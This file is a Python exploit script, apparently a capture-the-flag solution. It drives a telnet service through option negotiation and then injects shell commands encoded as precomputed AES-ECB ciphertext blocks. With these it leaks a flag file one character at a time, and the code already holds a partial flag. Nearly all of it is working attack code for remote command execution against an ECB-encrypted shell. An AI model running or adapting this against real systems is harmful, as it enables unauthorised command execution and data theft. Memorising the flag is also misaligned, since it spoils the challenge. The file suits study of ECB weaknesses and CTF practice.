from ptrlib import *
from time import sleep

cmd = "cat flag.txt"

table = {'l': 'YiqMxpZQz+5dPf+qELowBw==', 's': 'US5MJOeTx6L69iQT3Y8B9g==', ' ': '83jbJmmZc/RUXML8GcGuVg==', '-': 'h8zZvECdaFr730Mgo5EgYQ==', 'a': 'RdGNIA97r2yYuQsdXjbQGA==', '\r': 'S+79/0xJH6oVAqvGSE+Vlw==', 'd': 'vCffRJyLzPpoDVYNvxEtoA==', 't': 'MufXoG4oKY+tLj7TNMzMtQ==', 'e': '9+fXRGjlf3TvpwR6XiqcSw==', '>': 'bIyEa1uO0qUPR+sBqjAJ8g==', 'm': '0bGyNN1VKjWCxituvKDVvg==', 'o': '/Ks7iNV5tZaZT32Epav0CA==', 'n': 'KLVDOWDtxnck6THwQuPfGg==', 'i': 'L2/wiXcz7QQyFdbuDe14+w==', 'r': 'MC9KVKLGfFmxvdr6qNuZpA==', '.': 'gCe+M22NmuwF6cPVKGGoZQ==', 'x': 'wJNrzltAAb7rg/64niXZNg==', '\n': '92fKIeYPq2HyqG8DSo2Mfw==', 'c': 'XpjdNQ+r0XfWy25TW5lyAg==', 'h': '4iLXaYY1As8N9+wW+PVQOg==', '"': 'WSThaqht6loKlvNDraoarw==', '=': 'Tkb8E728rfsc+V1i5HtOzQ==', 'p': 'lwzGU75ZfX1C+vFQE1ahTQ==', 'u': 'mJoY/dqOlVLjsIzq/ZmGbg==', 'f': 'qgZnSf9/KcpMFM90/ZaklQ==', '/': 'pxsE18FW3UofpVPzG1RchA==', 'g': 'lwA3zobBmueRmJyafjFH9A=='}
table['0'] = "Rb3L4ahgBxYF/IdBTL57hA==" # perl -e "print 1-1"
table['1'] = "4KSMY2LtzmO0J+Re2zm5SA==" # perl -e "print a==a"
table['2'] = "8RzE+OIkCUFK64ugcHhXQA==" # perl -e "print 11-9"
table['3'] = "f1mxrFPM9PVF75buJmOboQ==" # perl -e "print 11-8"
table['4'] = "T1+xUPbu7ZUutGjQKP5LiA==" # perl -e "print 11-7"
table['5'] = "hkkc57hdpF5mIeGst8ukng==" # perl -e "print 13-8"
table['6'] = "dG00AWVEFzHzlIrD6CpIJg==" # perl -e "print 13-7"
table['7'] = "wfaWXQDyLsMQv2BRmCeKyg==" # perl -e "print 10-3"
table['8'] = "Rb9nFm2lmnm5yYWRAPH8hw==" # perl -e "print 10-2"
table['9'] = "s7dNRQ+EpHGRxLqHeed3cg==" # perl -e "print 10-1"
table['b'] = "dc0vX2aBZQHH8URkiN+lcQ==" # perl -e "print chr 98"
table['_'] = "upmrZVTDYlF3ND4qq5nRGA==" # perl -e "print chr 95"
table[';'] = "QdV4wDKOO9YFcByyx9Yd7g==" # perl -e "print chr 59"
table['<'] = "CmO82n0RV4/IlrLulEhmPQ==" # perl -e "print chr 60"
table[','] = "nfUh6n2OyFF9KWsGNvBOUg==" # perl -e "print chr 44"
table['\''] = "/nwRl3gUFmvkck1HS2hN8A==" # perl -e "print chr 39"
table['('] = "RCxXpJCkd2VkzWUu4ewq6g==" # perl -e "print chr 40"
table[')'] = "o/hGtid/Vj9SQPY+G5HVng==" # perl -e "print chr 41"
table['$'] = "9vdWA+lydZtXCnlv3ij6zQ==" # perl -e "print chr 36"
table['\\'] = "T8H0e39d6+vs27mL65eFmA==" # perl -e "print chr 92"
table['{'] = "dXrs8ji7V1tUaIqQGd1Yeg==" # perl -e "print chr 123"
table['|'] = "IsqHLoqtGCm/Mh7w7Ro1rQ==" # perl -e "print chr 124"
table['}'] = "CMnbhPqLgz38brWXSdY1Tg==" # perl -e "print chr 125"
table['~'] = "KrWM6j9cPxWHfuSUrySEEw==" # perl -e "print chr 126"


# cat flag.txt|fold -s1|sed -n ?p|tr -d "\n"
result = "gigem{43s_3cb_b4d_a5c"
ofs = len(result)
while True:
    """ Initialize """
    sock = Socket("172.30.0.2", 6023)

    # Stage 0
    assert sock.recv(3) == b'\xff\xfd\x18'
    sock.send("\xff\xfb\x18")
    # Stage 1
    assert sock.recv(6) == b'\xff\xfa\x18\x01\xff\xf0'
    assert sock.recv(3) == b'\xff\xfb\x03'
    assert sock.recv(3) == b'\xff\xfb\x01'
    sock.send("\xff\xfa\x18\x00XTERM-256COLOR\xff\xf0")
    assert sock.recv(3) == b'\xff\xfb\x00'
    assert sock.recv(3) == b'\xff\xfd\x27'
    assert sock.recv(3) == b'\xff\xfd\x1f'
    assert sock.recv(3) == b'\xff\xfd\x2a'
    assert sock.recv(6) == b'\xff\xfa\x18\x01\xff\xf0'
    sock.send("\xff\xfd\x03")
    sock.send("\xff\xfd\x01")
    sock.send("\xff\xfd\x00")
    sock.send("\xff\xfb\x27")
    sock.send("\xff\xfb\x1f")
    sock.send("\xff\xfd\x03\xff\xfd\x01\xff\xfd\x00\xff\xfb\x27\xff\xfb\x1f\xff\xfa\x1f\x00\x7e\x00\x23\xff\xf0\xff\xfc\x2a")
    # Stage 2
    sock.recv(0x28)
    sock.send("\xff\xfa\x18\x00XTERM-256COLOR\xff\xf0")
    assert sock.recv(3) == b'\xff\xfd\x00'
    sock.send("\xff\xfa\x27\x00\x03LANG\x03TERM\x03COLUMNS\x03LINES\x00DISPLAY\x01pwned:0\x03XAUTHORITY\x01/tmp/kde-ptr/xauth-1000-_0\x00DISPLAY\x01pwned:0\x03XAUTHORITY\x01/tmp/kde-ptr/xauth-1000-_0\x00DISPLAY\x01pwned:0\xff\xf0\xff\xfb\x00")

    # Shell!
    script = cmd + "|fold -s1|sed -n {}p|tr -d '\\n'\r\n".format(ofs)
    exp = ""
    for c in script:
        if c in table:
            exp += table[c]
        else:
            print("You can't use the character!: '{}'".format(c))
            break
    else:
        sock.send(exp)
        sock.recvonce(len(exp) - len(table['\n']))
        data = sock.recv()[:24]
        print(data)
        for key in table:
            if table[key] == bytes2str(data):
                result += key
                break
        else:
            result += "?"
        dump("Result: " + result)

    sock.close()
    ofs += 1
